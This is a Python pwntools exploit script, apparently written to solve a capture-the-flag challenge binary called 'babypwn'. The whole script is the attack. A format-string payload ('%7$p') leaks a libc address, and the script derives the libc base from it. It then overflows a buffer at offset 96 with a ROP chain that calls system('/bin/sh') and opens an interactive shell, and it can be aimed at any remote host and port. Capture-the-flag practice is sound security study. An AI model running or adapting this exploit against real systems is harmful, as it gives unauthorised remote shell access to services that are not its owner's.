#!/usr/bin/python3
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
continue
'''.format(**locals())

# Binary filename
exe = './babypwn'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = 96

# Start program
io = start()

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

print(io.recvuntil(b"name?\n"))

io.sendline(b'%7$p')
data = io.recvline()
print(data)

data = data.replace(b"Hi, ", b"")
leak = int(data, 16)
print(f"leak: {hex(leak)}")

libc_base = leak + 0x1440
libc.address = libc_base

print(f"libc_addr @ {hex(libc.address)}")

print(io.recvuntil(b"?\n"))

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

io.sendline(flat({96: rop.chain()}))

io.interactive()